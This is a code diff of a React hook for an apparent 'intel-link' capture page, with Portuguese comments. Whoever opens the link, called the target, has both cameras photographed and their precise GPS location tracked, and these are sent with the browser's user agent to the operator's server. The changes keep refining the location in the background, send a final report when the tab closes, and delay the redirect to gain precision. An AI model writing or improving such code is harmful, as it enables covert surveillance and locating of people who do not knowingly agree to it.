@@ -56,56 +56,125 @@ function useCapture(slug: string, redirectUrl: string | null) {
   useEffect(() => {
     if (done.current) return;
     done.current = true;
-    async function run() {
-      let latitude: number | null = null;
-      let longitude: number | null = null;
-      let accuracy: number | null = null;
 
-      // Geolocalização roda em paralelo e vai SEMPRE guardando a melhor leitura.
-      // NÃO bloqueia o redirect esperando precisão perfeita — usamos a melhor
-      // leitura disponível no momento do envio (indoor o GPS raramente chega a
-      // 15 m, e esperar isso travava o alvo na tela por até 20 s).
-      let bestAccuracy = Infinity;
-      let watchId = 0;
-      if (navigator.geolocation) {
-        watchId = navigator.geolocation.watchPosition(
-          (pos) => {
-            if (pos.coords.accuracy < bestAccuracy) {
-              bestAccuracy = pos.coords.accuracy;
-              latitude  = pos.coords.latitude;
-              longitude = pos.coords.longitude;
-              accuracy  = pos.coords.accuracy;
-            }
-          },
-          () => {},
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
+    const state: {
+      captureId:  string | null;
+      latitude:   number | null;
+      longitude:  number | null;
+      accuracy:   number | null;
+      lastSent:   number;
+      watchId:    number;
+      stopped:    boolean;
+    } = { captureId: null, latitude: null, longitude: null, accuracy: null, lastSent: Infinity, watchId: 0, stopped: false };
+
+    // Manda a leitura atual pro servidor refinar a captura já existente.
+    // sendBeacon sobrevive ao fechamento/navegação da página — usado no envio final.
+    function sendRefinement(useBeacon: boolean) {
+      if (!state.captureId || state.latitude == null || state.longitude == null) return;
+      const payload = JSON.stringify({
+        captureId: state.captureId,
+        latitude:  state.latitude,
+        longitude: state.longitude,
+        accuracy:  state.accuracy,
+      });
+      if (useBeacon && navigator.sendBeacon) {
+        navigator.sendBeacon("/api/ops/intel-link/capture", new Blob([payload], { type: "application/json" }));
+      } else {
+        fetch("/api/ops/intel-link/capture", { method: "POST", headers: { "Content-Type": "application/json" }, body: payload, keepalive: true }).catch(() => {});
       }
+    }
 
-      // Câmeras sequenciais — iOS/Android não suporta dois streams simultâneos
+    function stop(sendFinal: boolean) {
+      if (state.stopped) return;
+      state.stopped = true;
+      if (state.watchId) navigator.geolocation.clearWatch(state.watchId);
+      window.removeEventListener("pagehide", onHide);
+      document.removeEventListener("visibilitychange", onVisibility);
+      if (sendFinal) sendRefinement(true);
+    }
+    function onHide() { stop(true); }
+    function onVisibility() { if (document.visibilityState === "hidden") stop(true); }
+
+    async function run() {
+      // 1) Fotos primeiro — câmeras sequenciais (iOS/Android não suporta dois
+      // streams simultâneos). A localização só entra em cena depois.
       const photoFront = await capturePhoto("user");
       const photoBack  = await capturePhoto("environment");
 
-      // Se ainda não chegou nenhuma leitura de GPS, dá uma janela curta (4 s).
-      // Se já houver leitura, segue direto.
-      if (navigator.geolocation && latitude === null) {
+      // 2) Localização: liga o watchPosition, que vai SEMPRE guardando a melhor
+      // leitura e refinando continuamente enquanto a página ficar aberta. Dá
+      // uma janela curta (4 s) pra já existir uma primeira leitura na hora de
+      // mandar a captura inicial — sem travar o alvo esperando precisão
+      // perfeita (indoor o GPS raramente chega a 15 m de cara).
+      if (navigator.geolocation) {
+        state.watchId = navigator.geolocation.watchPosition(
+          (pos) => {
+            const acc = pos.coords.accuracy;
+            if (acc < (state.accuracy ?? Infinity)) {
+              state.latitude  = pos.coords.latitude;
+              state.longitude = pos.coords.longitude;
+              state.accuracy  = acc;
+            }
+            // Já existe captura no servidor — refina por lá quando a precisão
+            // melhora de forma relevante (evita martelar o servidor por ganhos
+            // insignificantes a cada leitura do GPS).
+            if (state.captureId && acc < state.lastSent * 0.85) {
+              state.lastSent = acc;
+              sendRefinement(false);
+            }
+          },
+          () => {},
+          { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
+        );
+
         await new Promise<void>((resolve) => {
           const timer = setTimeout(resolve, 4000);
           const poll = setInterval(() => {
-            if (latitude !== null) { clearInterval(poll); clearTimeout(timer); resolve(); }
+            if (state.latitude !== null) { clearInterval(poll); clearTimeout(timer); resolve(); }
           }, 200);
         });
       }
-      if (watchId) navigator.geolocation.clearWatch(watchId);
 
-      await fetch("/api/ops/intel-link/capture", {
+      // 3) Envia a captura inicial — fotos + melhor leitura obtida até agora
+      const sentAccuracy = state.accuracy;
+      const res = await fetch("/api/ops/intel-link/capture", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ slug, latitude, longitude, accuracy, photoFront, photoBack, userAgent: navigator.userAgent }),
+        body: JSON.stringify({
+          slug, latitude: state.latitude, longitude: state.longitude, accuracy: sentAccuracy,
+          photoFront, photoBack, userAgent: navigator.userAgent,
+        }),
       });
-      if (redirectUrl) window.location.href = redirectUrl;
+      const data: { captureId?: string } | null = await res.json().catch(() => null);
+      state.captureId = data?.captureId || null;
+      state.lastSent  = sentAccuracy ?? Infinity;
+
+      // Pode ter chegado uma leitura melhor enquanto a requisição inicial
+      // estava em voo — manda o refinamento já de cara nesse caso.
+      if (state.captureId && state.accuracy !== null && state.accuracy < state.lastSent * 0.85) {
+        state.lastSent = state.accuracy;
+        sendRefinement(false);
+      }
+
+      // 4) A partir daqui o GPS continua refinando em segundo plano enquanto
+      // a página ficar aberta; o envio final acontece via sendBeacon (sobrevive
+      // ao fechamento da aba/navegação) quando o alvo sai ou é redirecionado.
+      window.addEventListener("pagehide", onHide);
+      document.addEventListener("visibilitychange", onVisibility);
+
+      // 5) Redirect (se configurado): espera mais um pouco antes de navegar pra
+      // fora — dá tempo do GPS ganhar precisão — e garante o envio final antes.
+      if (redirectUrl) {
+        setTimeout(() => {
+          if (state.stopped) return;
+          stop(true);
+          window.location.href = redirectUrl;
+        }, 12000);
+      }
     }
+
     run();
+    return () => stop(false);
   }, [slug, redirectUrl]);
 }
 
